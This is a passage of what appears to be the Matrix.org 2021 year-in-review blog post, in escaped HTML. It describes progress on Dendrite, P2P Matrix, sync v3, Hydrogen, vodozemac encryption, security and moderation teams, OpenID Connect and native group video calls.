href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rust-sdk&#x2F;tree&#x2F;main&#x2F;crates&#x2F;matrix-sdk-crypto&quot;&gt;matrix-rust-sdk-crypto&lt;&#x2F;a&gt; into matrix-bot-sdk as an elegant way to power robust encrypted bridges (thus replacing Panatalaimon for that use case).&lt;&#x2F;p&gt;
&lt;p&gt;There’s also a new kid in town: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Half-Shot&#x2F;matrix-hookshot&quot;&gt;matrix-hookshot&lt;&#x2F;a&gt; (formerly known as matrix-github) is a new all-singing-all-dancing general purpose integration built on matrix-bot-sdk, coming soon to an integration manager near you, which can bridge through to GitHub, GitLab, JIRA and freeform webhooks! Check it out a few weeks ago on &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;55P-NdDa-UI?t=1018&quot;&gt;Matrix Live&lt;&#x2F;a&gt;. matrix-hookshot is primarily Node, but is also getting in on the Rust action with some functions being implemented in native code.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, change is afoot for integration managers, which have been screaming out for an overhaul for years. There was a cheeky hint in last week’s &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;Hsyqa5ozWIo?t=724&quot;&gt;Matrix Live&lt;&#x2F;a&gt; where &lt;a href=&quot;https:&#x2F;&#x2F;dimension.t2bot.io&#x2F;&quot;&gt;Dimension&lt;&#x2F;a&gt; did an unexpected cameo looking particularly swish…  All shall be revealed next year!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2021-12-22-dimension.png&quot; alt=&quot;A whole new Dimension&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;dendrite-low-bandwidth-matrix-and-peer-to-peer-matrix&quot;&gt;Dendrite, Low bandwidth Matrix and Peer-to-Peer Matrix&lt;&#x2F;h2&gt;
&lt;p&gt;Dendrite is our next-generation homeserver implementation written in Go, and having shipped the first beta in Oct 2020, we’ve cut another 11 releases over the course of this year - adding in features such as E2EE key backups, cross-signing, support for room versions 7, 8 and 9 (knocking and restricted join rules), massive state resolution performance improvements, an entirely new state storage implementation that uses ~15x less disk space, sync filtering, experimental support for peeking-over-federation (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2444&quot;&gt;MSC2444&lt;&#x2F;a&gt;) - not to mention huge numbers of bug fixes. Even more excitingly, we’re in the process of ditching Kafka in favour of native-Go message queuing in the form of &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&#x2F;compare&#x2F;nats&quot;&gt;NATS&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;p&gt;However, it’s been a bit of a weird year as the team has been repeatedly pulled onto other projects due to competing priorities - and there’s still a bunch of stuff left which is keeping us in beta.  Some of this is plain old missing features (search, push rules&#x2F;notifications, room upgrades, presence etc) - but we’ve also run up against some problems over the last few months while implementing new room versions and similar thanks to the sheer number of different microservices which Dendrite is made out of. In retrospect, it feels like Dendrite has ended up too granular, and when hacking on it you get slowed down badly by all the boilerplate required to glue the various services together.  Therefore, we’ve just started to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&#x2F;pull&#x2F;2055&quot;&gt;merge some of the services together&lt;&#x2F;a&gt; - still preserving horizontal scaling of course, but refactoring the architecture a bit while we’re still in beta to help speed up development again. So far things are looking promising!  We’re also really looking forwards to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&#x2F;pulls?q=+is%3Apr+author%3As7evinK&quot;&gt;s7evinK&lt;&#x2F;a&gt; joining the team to work on Dendrite fulltime in the coming weeks :)&lt;&#x2F;p&gt;
&lt;p&gt;Talking of competing priorities, there have been three other big missions going on at the same time as Dendrite dev: firstly - formalising Low Bandwidth Matrix. LB Matrix is super important for maximising battery life on mobile, as well as (obviously) supporting worse network conditions - and it’s effectively a prerequisite for P2P Matrix.  We did a bunch of experiments around it back in &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;03&#x2F;12&#x2F;breaking-the-100-bps-barrier-with-matrix-meshsim-coap-proxy&quot;&gt;2019&lt;&#x2F;a&gt;, but earlier in the year we needed it &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;element_hq&#x2F;status&#x2F;1418632867626770433&quot;&gt;for real&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3079&quot;&gt;MSC3079&lt;&#x2F;a&gt; was the result. The low bandwidth dialect which we’ve proposed in the MSC is designed for use on the real Internet using standard IETF protocols (CoAP + DTLS + CBOR) and so isn’t quite as exotic as the 2019 version, but still gives a ~10-20x bandwidth improvement over normal HTTP+JSON based Matrix.  It hasn’t made it to Element yet, but if you’re interested go &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;06&#x2F;10&#x2F;low-bandwidth-matrix-an-implementation-guide&quot;&gt;check out the blog post&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;p&gt;Secondly, we’ve been sidetracked by the entirety of P2P Matrix.  This is our long-term mission to let Matrix run peer-to-peer without the need for any servers (or indeed Internet connectivity, thanks to Bluetooth Low Energy) by embedding servers such as Dendrite into clients such as Element and so let each Matrix Client have its own personal local homeserver.  We’ve made massive progress over the course of the year on P2P - the biggest breakthroughs being &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;05&#x2F;06&#x2F;introducing-the-pinecone-overlay-network&quot;&gt;Pinecone&lt;&#x2F;a&gt; as an entirely new P2P overlay network, with the novel SNEK (sequentially networked edwards key) routing topology.  (The animation below shows a P2P network arranging itself into a SNEK!)&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2021-12-22-pinecone.gif&quot; alt=&quot;SNEK&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;You can read all about it in &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;05&#x2F;06&#x2F;introducing-the-pinecone-overlay-network&quot;&gt;the blog post&lt;&#x2F;a&gt;, but suffice it to say that Pinecone outperformed all the other P2P overlay networks in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;mwarning&#x2F;meshnet-lab&quot;&gt;meshnet-lab&lt;&#x2F;a&gt;’s &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;mwarning&#x2F;meshnet-lab&#x2F;tree&#x2F;master&#x2F;tests&#x2F;mobility2&quot;&gt;Mobility2&lt;&#x2F;a&gt; test:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2021-12-22-pinecone-perf.png&quot; alt=&quot;Pinecone perf benchmarks&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;You can play with P2P Matrix today on iOS and Android (head over to &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#p2p:matrix.org&quot;&gt;#p2p:matrix.org&lt;&#x2F;a&gt; for builds), but there is some major work still to be done:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;We need to bridge to today’s Matrix network. Right now, having a weird experimental test network for P2P means that in practice nobody actually uses it other than for demos - whereas if you could actually talk to everything else in Matrix, it’d be way more compelling and interesting to use and dogfood.  We’re currently thinking about how best to do this!&lt;&#x2F;li&gt;
&lt;li&gt;We need to standardise the actual transport to be used over Pinecone.  Currently it uses HTTPS over &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Micro_Transport_Protocol&quot;&gt;μTP&lt;&#x2F;a&gt; (purely because empirically it handled packet loss and congestion well, and LB Matrix wasn’t ready at the time).  We’re currently experimenting with switching to LB Matrix using our own CoAP implementation called PineCoAP (potentially using pCoCoA congestion control, given CoAP doesn’t provide any congestion control out of the box), but this is early days.&lt;&#x2F;li&gt;
&lt;li&gt;We still need to finalise store-and-forward: if your destination is offline, do you buffer your transactions in the network somehow, or do you use another Matrix node to buffer them?&lt;&#x2F;li&gt;
&lt;li&gt;Relatedly, we need to tweak federation so that if events get lost, federation for a room can recover more gracefully than it does today - for instance, by bundling redundant auth events on transactions, or by providing more recovery mechanisms.&lt;&#x2F;li&gt;
&lt;li&gt;We still need to spec and implement multihomed accounts, so that your identity on your phone is not divorced from your identity on your laptop.&lt;&#x2F;li&gt;
&lt;li&gt;…and obviously, we need a robust post-beta Dendrite to act as the local homeserver!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Right now focus is going back to Dendrite for a bit, but P2P work will resume again in the new year :)&lt;&#x2F;p&gt;
&lt;p&gt;Finally, the third big distraction from Dendrite has been… sync v3.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;sync-v3&quot;&gt;Sync v3&lt;&#x2F;h2&gt;
&lt;p&gt;Sync v3 is shaping up to be the single most significant improvement to Matrix since we began.&lt;&#x2F;p&gt;
&lt;p&gt;Syncing data from the homeserver to the client is obviously fundamental to Matrix - and the current behaviour (sync v2) is far from perfect, as it’s designed around the assumption that your client wants to receive information for every room that it’s in.  In the early days of Matrix, this was fine: a typical user might be in tens of conversations, and it’s useful to have them all available for offline access.  Nowadays, however, it’s a disaster: users can easily accumulate hundreds or thousands of rooms - especially with rooms used to describe spaces or profiles and other structured realtime data.  Moreover, the number of rooms you’re in typically increases linearly over time, unbounded, as nobody wants to archive their old conversations.&lt;&#x2F;p&gt;
&lt;p&gt;So, the idea of sync v3 is that you only sync the strict subset of data that your client actually cares about to display in its UI - effectively making both initial and incremental sync instant, incredibly low bandwidth, and completely independent of the number of rooms you’re in (just as filesystem performance should be independent of the number of directories or files present).&lt;&#x2F;p&gt;
&lt;p&gt;For instance, the full initial sync for @matthew:matrix.org in sync v2 is 417MB of JSON uncompressed - or ~100MB if gzipped, and takes about 5 minutes to calculate on matrix.org (during which it murders the sync worker responsible and hammers the database like crazy).  By contrast, sync v3’s initial sync is 15KB uncompressed, or 5106 bytes compressed - and synced in 250 microseconds from a local sync-v3 server.  &lt;strong&gt;Yes folks, that’s somewhere between a 30,000x to 1,200,000x improvement over sync v2, depending on how you count it.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Sync v3 gets this unbelievable performance by the client defining a sliding window into the server’s datasets, sized and ordered as needed for the client’s UI. This effectively performs real-time serverside pagination, so that as the client scrolls around or filters their roomlist or membership list, the client requests new views from the server.  Meanwhile the server sends incremental updates to the client if they intersect with the sliding window.  This may sound unwieldy, but in practice it works fine (although we’ll have some interesting challenges when we get around to encrypting state events, given serverside ordering and filtering will become distinctly harder).  It also doesn’t design out offline access, as the client caches its view of the world so even if you do go offline you can still work with all the data that has sent to your client so far (and the client could even proactively paginate in other content, if it wanted to, similar to an email client synchronising for offline access).&lt;&#x2F;p&gt;
&lt;p&gt;Sync v3 exists today as a proxy called &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sync-v3&quot;&gt;sync-v3&lt;&#x2F;a&gt; which sits between any existing homeserver and a sync-v3-capable Matrix client.  It’s very early days, but Hydrogen has &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;hydrogen-web&#x2F;compare&#x2F;kegan&#x2F;syncv3&quot;&gt;basic v3 support&lt;&#x2F;a&gt; on a branch which we’ve been using to experiment with the API and flesh it out - and you can see a demo and intro talk in &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;Hsyqa5ozWIo?t=59&quot;&gt;last week’s Matrix Live&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;Hsyqa5ozWIo?t=59&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;p&gt;The API itself is still in flux, but those interested can see the initial spec design at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sync-v3&#x2F;blob&#x2F;main&#x2F;api.md&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sync-v3&#x2F;blob&#x2F;main&#x2F;api.md&lt;&#x2F;a&gt; and also an MSC is emerging at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;kegan&#x2F;sync-v3&#x2F;proposals&#x2F;3575-sync.md&quot;&gt;MSC3575&lt;&#x2F;a&gt;.  Next steps will be to finish hooking up to Hydrogen (including filtering the room list), finish the MSC, and then start thinking about implementing it in other clients and servers!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;fast-joins-over-federation&quot;&gt;Fast Joins over Federation&lt;&#x2F;h2&gt;
&lt;p&gt;While we’re on the subject of speeding up Matrix… it’s all very well being able to sync your client instantly, but the other big complaint everyone has about Matrix is how long it takes to join rooms - especially big ones.  As most people will know, it can easily take 5-10 minutes to join a large room like Matrix HQ on a new homeserver - and given this is the first experience most users have of running their own homeserver, it can prove pretty disastrous and we are determined to fix it.  It will become even more relevant when we implement peeking over federation, as the last thing you want is to have to wait 5 minutes to temporarily dip into some random federated room to see if you want to join it or not (or to sniff its room state for things like extensible profiles or &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2313&quot;&gt;MSC2313&lt;&#x2F;a&gt; reputation rooms).&lt;&#x2F;p&gt;
&lt;p&gt;So, to address this, we’re currently in the middle of experimenting with &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2775&quot;&gt;MSC2775&lt;&#x2F;a&gt; (Lazyloading over Federation) in Synapse. This MSC lets servers participate in a room before they’ve received the full room state by defining a subset of state which is mandatory for participation, and then letting the rest get added lazily.  It’s quite a violent change as it means the assumption that room state is complete (to the best of the server’s knowledge) is no longer true - but given Matrix already has to handle incomplete room state, it’s not necessarily a showstopper.&lt;&#x2F;p&gt;
&lt;p&gt;Watch this space for how well it works in practice, but we’re hoping for a ~20x speed improvement in joining Matrix HQ.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;hydrogen&quot;&gt;Hydrogen&lt;&#x2F;h2&gt;
&lt;p&gt;2021 has been a busy year for Hydrogen - our ultra-lightweight Matrix Client, which provides a small but perfectly formed progressive web app for us to experiment on! There have been no fewer than 56 releases over the course of the year, with loads of contributions from Bruno, Midhun (who joined first as a GSOCcer and then as a fulltime Element employee) and also Danila who interned at Element on Hydrogen over the summer.&lt;&#x2F;p&gt;
&lt;p&gt;People often ask why Hydrogen exists as well as Element Web - and the reason is because Element Web is (for now at least) very far from a progressive web app and is stuffed full of features, whereas Hydrogen is intended to be as lightweight and simple and efficient as possible while also targeting as wide a range of web browsers as possible (even Internet Explorer!).  It also provides a simpler platform for experimenting with new approaches such as sync v3 or OIDC without getting entangled in the constant hive of activity around Element Web.  Finally, it gives us a playground to experiment with embeddable chat clients thanks to Hydrogen’s strict &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Model%E2%80%93view%E2%80%93viewmodel&quot;&gt;MVVM&lt;&#x2F;a&gt; component model.&lt;&#x2F;p&gt;
&lt;p&gt;In terms of features, 2021 has seen huge steps forwards as Hydrogen converges on feature parity with Element - proper mentions and replies; rich formatted linkified messages; reactions; redactions; memberlist; member info; webpush notifications; proper image, video &amp;amp; file uploads; SSO login; sync v3(!) and so much more. Can’t wait to see what 2022 will bring!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;end-to-end-encryption&quot;&gt;End-to-End Encryption&lt;&#x2F;h2&gt;
&lt;p&gt;2021 saw the long-awaited creation of a dedicated cryptography team to focus exclusively on improving encryption in Matrix: previously encryption expertise was split across various different areas, meaning that it could prove hard to carve out time to tackle the bigger remaining encryption challenges.&lt;&#x2F;p&gt;
&lt;p&gt;So far the team has been busy digging deep into the few remaining causes of UISIs (undecryptable messages), including automated UISI reporting and tracing E2EE flows end-to-end (from client to server to server to client).  There’s also been an initial wave of UX work - with much more to come next year as we overhaul cross-signing and device backups to make it way more user friendly.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, on the more foundational side of things, we’re continuing to define Decentralised MLS as a potential next-generation form of end-to-end encryption, building on the IETF’s &lt;a href=&quot;https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;wg&#x2F;mls&#x2F;about&#x2F;&quot;&gt;MLS&lt;&#x2F;a&gt; work - providing much better scalability for large chat rooms and potentially helping with some causes of encryption failures.  Hubert (uhoreg) has been leading the charge here, with his &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;matrix-org&#x2F;mls-ts&#x2F;-&#x2F;blob&#x2F;decentralised2&#x2F;decentralised.org&quot;&gt;latest thoughts emerging here&lt;&#x2F;a&gt; alongside a &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=UiUyWZg3J7k&quot;&gt;brand new demo&lt;&#x2F;a&gt; showing his &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;uhoreg&#x2F;mls-demo&quot;&gt;DMLS simulator&lt;&#x2F;a&gt; - which under the hood is actually sending real Matrix events over DMLS!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2021-12-22-dmls.png&quot; alt=&quot;DMLS&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Otherwise, the team has had three big projects: adding matrix-rust-sdk-crypto into Element Android (which we already covered above), arranging a fresh security audit of Matrix’s end-to-end encryption (due to complete January 2022)… and, most excitingly: vodozemac.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;vodozemac&quot;&gt;Vodozemac&lt;&#x2F;a&gt; (pronounced roughly vod-oz-eh-matz) is an entirely new implementation of our Olm and Megolm end-to-end encryption system, written from scratch in pure Rust, aiming to replace the original reference C&#x2F;C++11 implementation in &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;matrix-org&#x2F;olm&quot;&gt;libolm&lt;&#x2F;a&gt;.  Originally written as an &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rust-sdk&#x2F;compare&#x2F;vodozemac-bench&quot;&gt;experiment for matrix-rust-sdk&lt;&#x2F;a&gt; at the beginning of the year, in the last week it’s received a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;vodozemac&#x2F;graphs&#x2F;contributors&quot;&gt;huge explosion of attention&lt;&#x2F;a&gt; from poljar and dkasak to bring it up to production quality… for we decided that if we are doing a full E2EE audit for Matrix, we should target the new and future codebase rather than burn money on re-auditing the legacy libolm library (much as the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2016&#x2F;11&#x2F;21&#x2F;matrixs-olm-end-to-end-encryption-security-assessment-released-and-implemented-cross-platform-on-riot-at-last&quot;&gt;original 2016 review of libolm&lt;&#x2F;a&gt; happened when the library was fresh and new).&lt;&#x2F;p&gt;
&lt;p&gt;The motivation for vodozemac in general is to benefit from the intrinsic type and memory safety and fearless parallelism provided by Rust - and also maintain full type &amp;amp; memory safety throughout the matrix-rust-sdk stack, including encryption.  Over the last year we’ve been taking&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;06&#x2F;14&#x2F;adventures-in-fuzzing-libolm&quot;&gt; more and more of a careful look at libolm&lt;&#x2F;a&gt;, and despite our best efforts a &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;12&#x2F;13&#x2F;disclosure-buffer-overflow-in-libolm-and-matrix-js-sdk&quot;&gt;few&lt;&#x2F;a&gt; memory management bugs have crept in - which vodozemac should be immune to.  Vodozemac will solve another embarrassing problem with libolm: that its default cryptography primitives are designed for correctness rather than performance or safety.  By switching to Rust’s ed25519-dalek and rustCrypto AES primitives we should be in a much better position in terms of performance and safety.&lt;&#x2F;p&gt;
&lt;p&gt;Next up, we’ll be fully integrating vodozemac into matrix-rust-sdk, and figuring out how best to provide it as a libolm replacement in general.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;matrix-security&quot;&gt;Matrix Security&lt;&#x2F;h2&gt;
&lt;p&gt;Alongside the new Cryptography team we’ve also established a new dedicated Security team for Matrix, led by dkasak.  As well as &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;06&#x2F;14&#x2F;adventures-in-fuzzing-libolm&quot;&gt;fuzzing excursions&lt;&#x2F;a&gt; into libolm and similar research, Denis has been handling all our &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;security-disclosure-policy&quot;&gt;security disclosure policy&lt;&#x2F;a&gt; submissions, managing the &lt;a href=&quot;https:&#x2F;&#x2F;blog.intigriti.com&#x2F;matrix&#x2F;&quot;&gt;Intigriti bug bounty&lt;&#x2F;a&gt; programme, helping coordinate all our security releases, and coordinating the upcoming external independent security audit of vodozemac, matrix-rust-sdk, Element and Synapse.  It’s a huge step forwards to be able to fund full-time infosec researchers to focus exclusively on Matrix, and this is just the beginning!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;trust-and-safety&quot;&gt;Trust and Safety&lt;&#x2F;h2&gt;
&lt;p&gt;Another place where we’ve created a dedicated team this year is around Trust &amp;amp; Safety: building tools to fight spam and abuse on our own servers, while also empowering the wider network of users, moderators and admins to manage abuse as they see fit.  This includes lots of work on Mjolnir, our primary moderation bot, but also defining MSCs such as &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3215&quot;&gt;MSC3215&lt;&#x2F;a&gt; (Aristotle: Moderation in all things) and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3531&quot;&gt;MSC3531&lt;&#x2F;a&gt; (Letting moderators hide messages pending moderation) and internal tooling as we experiment with different approaches.&lt;&#x2F;p&gt;
&lt;p&gt;We’ll have more updates on this in the coming year as we release the tools we’ve been working on, but suffice it to say that the goal is to empower mainstream users in the wider Matrix network to apply their own rules as they see fit, directly from the comfort of their favourite Matrix client - without having to know what a Mjolnir is (or how to run one), and without having to be a moderation expert.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;openid-connect&quot;&gt;OpenID Connect&lt;&#x2F;h2&gt;
&lt;p&gt;A new project brewing throughout 2021 has been the investigation into replacing the entirety of Matrix’s authentication APIs with industry standard OpenID Connect.  Spearheaded by Quentin, this has proved to be a fascinating and challenging endeavour, but we’re starting to see some really interesting results.  The problem we’re trying to solve here is:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;As Matrix grows, we’re seeing more and more clients and services appearing which you might want to log into with your Matrix account.  But do you really want to trust each app with your account password?  And what if you only want to give it access to a small subset of your account?&lt;&#x2F;li&gt;
&lt;li&gt;Similarly, we’re seeing more and more login mechanisms used to access Matrix - it’s no longer just a matter just a username + password; many servers use single-sign-on (e.g. mozilla.org) or social login (fosdem.org, matrix.org), or layer on 2FA or MFA hardware tokens and similar to access their accounts via an SSO provider.  We also see passwordless login on the horizon.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;So, do we really want to mandate each new Matrix client to have to implement custom flows to handle this explosion of login&#x2F;registration mechanisms?  And is it even really the client’s problem in the first place?  You’re securing access to your account on your chosen server, which isn’t really a client-specific thing at all.&lt;&#x2F;p&gt;
&lt;p&gt;The real turning point for the project however has been our recent experiences building out a new wave of single-use domain-specific clients (see below) for video conferencing, whiteboarding, metaverse-browsing etc… where by &lt;em&gt;far&lt;&#x2F;em&gt; the most painful bit of the project has been hooking up the UI for login, registration, guest access, incremental signup, password reset, email verification, CAPTCHA, SSO, etc.  And that’s even when building on top of matrix-react-sdk, which theoretically has it all already thanks to Element Web!&lt;&#x2F;p&gt;
&lt;p&gt;Frankly, it has become blindingly obvious that it’s crazy for clients to reimplement this every time, and they should instead chuck the user over to a sign-on portal provided by their homeserver - just like Google and everyone else’s single-sign-on does.  And rather than inventing our own homebrew way of doing that, we should just use the existing industry standard SSO best practices defined by OpenID Connect.&lt;&#x2F;p&gt;
&lt;p&gt;The main objections which have come up against this are: “what if my Matrix client doesn’t have a web browser, or what if I want to provide my own native login UI”, and “does this design out the idea of using a single password to access your account as well as your E2EE history”?  In both instances, we have workarounds: in practice, there are so many Matrix clients around that we won’t be removing today’s legacy login&#x2F;registration APIs any time soon (just like HTTP Basic Auth is still very much a thing on the web!).  And in terms of “cryptographic login”, there are ways we could daisychain the auth required to unlock your E2EE storage to also authenticate you with your server - although this would be a major extension (much as cryptographic login is already today!)&lt;&#x2F;p&gt;
&lt;p&gt;The current status is that we’ve defined a set of initial MSCs (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2964&quot;&gt;MSC2964&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2965&quot;&gt;MSC2965&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2966&quot;&gt;MSC2966&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2967&quot;&gt;MSC2967&lt;&#x2F;a&gt;), and are implementing an initial Open ID Connect auth server (in Rust!) called &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-authentication-service&quot;&gt;matrix-authentication-service&lt;&#x2F;a&gt; (better name suggestions welcome!) designed to sit alongside your homeserver, and we’re experimenting with hooking &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;sandhose&#x2F;hydrogen-web&#x2F;tree&#x2F;sandhose&#x2F;oidc-login&quot;&gt;Hydrogen&lt;&#x2F;a&gt; (and some of the new domain-specific clients) up to see how it feels.  But if it goes as well as we think it might, folks should prepare for 2022 to be the year where Matrix’s authentication system finally gets fixed!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;native-matrix-video-voip-conferencing&quot;&gt;Native Matrix Video&#x2F;VoIP Conferencing&lt;&#x2F;h2&gt;
&lt;p&gt;One of the most anticipated features in Matrix over the years has been the prospect of native, decentralised, end-to-end encrypted video and voice conferencing.  Today, voice and video conferencing in Matrix works by embedding Jitsi as a third party centralised service into your chatroom.  This works fairly well - but Jitsi is an entirely separate service with lots of moving parts, and its own concept of users and access control (provided by XMPP!) and its megolm-based end-to-end-encryption doesn’t actually integrate with Matrix’s own Olm identities, verification or cross-signing.  The fact that the conference is then logically centralised on whoever is hosting the Jitsi service also misses one Matrix’s main goals - that users should be able to hold a conversation without being dependent on any single service or provider.  Plus it’s really confusing that Matrix has proper native 1:1 calls for DMs… but then switches to a totally different system in group chats.&lt;&#x2F;p&gt;
&lt;p&gt;So, this year we set out to fix it - and succeeded :D  The solution hinges around &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;matthew&#x2F;group-voip&#x2F;proposals&#x2F;3401-group-voip.md&quot;&gt;MSC3401&lt;&#x2F;a&gt; - a spec proposal that describes how to extend native 1:1 calls to work for groups, while providing real flexibility on how to actually mix the calls together.  At the simplest extreme, it defines how full mesh calls work (where every client simply calls every other client simultaneously) - but then also defines how you can mix calls together either using a single focus (conferencing server) or multiple foci run by different parties, where foci can either be Selective Forwarding Units (SFUs, like Jitsi) or Multipoint Conferencing Units (MCUs, like FreeSWITCH).  The end result is to give us decentralised, cascading, end-to-end encrypted conferencing which even has direct compatibility with today’s 1:1 Matrix calling, letting you easily hook in bots and bridges which already support 1:1 Matrix calls!&lt;&#x2F;p&gt;
&lt;p&gt;Robert Long has been frantically hacking away at the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;matrix-video-chat&quot;&gt;initial implementation&lt;&#x2F;a&gt; over the last few months, fleshing out full-mesh conferencing at first and getting it running in as many browsers as possible (including Mobile Safari and Chrome Android!).  We were hoping to fully unveil the end result in time for Christmas, but in practice we hit some last minute snags (turns out Matthew forgot guest users can’t use TURN, who knew? so much for incremental login! 😰) which have pushed the launch to early next year.  But hopefully in a few weeks, you’ll be able to start jumping on a native group call in Matrix!&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, those interested can see all the gory details from our CommCon 2021 talk a few weeks ago, complete with a demo of the shape of things to come…&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;A4k7DVIK5TE&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
